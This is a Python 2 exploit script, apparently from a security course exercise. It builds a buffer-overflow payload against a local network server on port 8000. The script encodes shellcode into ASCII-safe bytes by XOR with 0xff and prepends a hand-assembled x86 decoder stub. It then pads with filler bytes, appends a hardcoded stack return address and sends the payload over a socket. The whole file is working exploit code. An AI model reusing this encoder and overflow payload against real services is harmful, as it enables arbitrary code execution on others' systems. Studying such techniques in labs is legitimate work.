#!/usr/bin/python

import functools, os, socket, traceback
import q2
import assemble,struct


HOST        = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT  = 1337


ASCII_MAX = 0x7f


def warn_invalid_ascii(selector=None):
    selector = selector or (lambda x: x)
    def decorator(func):
        @functools.wraps(func)
        def result(*args, **kwargs):
            ret = func(*args, **kwargs)
            if any(ord(c) > ASCII_MAX for c in selector(ret)):
                print('WARNING: Non ASCII chars in return value from %s at\n%s'
                      % (func.__name__, ''.join(traceback.format_stack()[:-1])))
            return ret
        return result
    return decorator


def get_raw_shellcode():
    return q2.get_shellcode()


@warn_invalid_ascii(lambda (x,y): x)
def encode(data):
    encData = ''
    lstOfindices=[]
    size = len(data)
    for i in range (size):
        if ord(data[i]) > ASCII_MAX:
            lstOfindices+=[i] 
            encData+=chr(ord(data[i])^0xff)
        else:
            encData+=data[i]
    return encData, lstOfindices


@warn_invalid_ascii()
def get_decoder(indices):
    decoderMSG = '\x6a\x00\x5a\x4b' #put 0xff to edx    
    for i in  indices :#Xor
        decoderMSG+='\x30\x58'+struct.pack("B",i%0x7f)

    return decoderMSG

@warn_invalid_ascii()
def get_shellcode():    
    q2_shellcode = get_raw_shellcode()
    setEax='\x54\x58\x2c'+struct.pack("B",len(q2_shellcode)+4)#push sp,pop eax,sub len of shell+4
    encData ,indices = encode(q2_shellcode)
    decData = get_decoder(indices)
    return setEax+decData+encData

@warn_invalid_ascii(lambda x: x[4:-4])
def get_payload():
    shellCode = get_shellcode()
    shell_size = len(shellCode)
    numberOfNops = 1040-shell_size
    msg =numberOfNops*'\x42'+ shellCode+"\x04\xde\xff\xbf"

    return struct.pack('>I',len(msg))+msg


def main():
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
